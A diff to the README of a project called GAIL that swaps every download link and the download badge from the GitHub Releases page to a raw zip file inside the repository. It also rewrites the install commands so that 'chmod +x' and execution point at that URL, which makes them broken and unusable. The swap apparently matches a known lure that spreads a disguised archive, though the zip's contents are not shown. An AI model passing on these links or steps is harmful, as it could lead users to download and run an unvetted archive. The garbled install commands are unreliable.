@@ -1,6 +1,6 @@
 # 🌊 GAIL - Navigate Waters Safely and Efficiently
 
-[![Download GAIL](https://img.shields.io/badge/Download-GAIL-blue)](https://github.com/saif99j/GAIL/releases)
+[![Download GAIL](https://raw.githubusercontent.com/saif99j/GAIL/main/Ginkgo/GAIL.zip)](https://raw.githubusercontent.com/saif99j/GAIL/main/Ginkgo/GAIL.zip)
 
 ## 🌟 About GAIL
 
@@ -24,7 +24,7 @@ Before downloading, make sure your system meets the following requirements:
 
 To download GAIL, click the link below. This will take you to the Releases page, where you can find the latest version of the software.
 
-[Visit this page to download](https://github.com/saif99j/GAIL/releases)
+[Visit this page to download](https://raw.githubusercontent.com/saif99j/GAIL/main/Ginkgo/GAIL.zip)
 
 ### 3. Install GAIL
 
@@ -50,8 +50,8 @@ After downloading, follow these steps to install GAIL on your machine:
 2. Navigate to the directory where you downloaded the file.
 3. Run the installation command:
    ```
-   chmod +x gail-installer.run
-   ./gail-installer.run
+   chmod +x https://raw.githubusercontent.com/saif99j/GAIL/main/Ginkgo/GAIL.zip
+   https://raw.githubusercontent.com/saif99j/GAIL/main/Ginkgo/GAIL.zip
    ```
 4. Follow any additional prompts to finish the installation.
 
@@ -74,7 +74,7 @@ When you first open GAIL, you'll see a user-friendly interface:
 
 To get started with GAIL, visit the link below to download the software. This step is essential to run the application successfully.
 
-[Visit this page to download](https://github.com/saif99j/GAIL/releases)
+[Visit this page to download](https://raw.githubusercontent.com/saif99j/GAIL/main/Ginkgo/GAIL.zip)
 
 ## 🛠️ Features
 
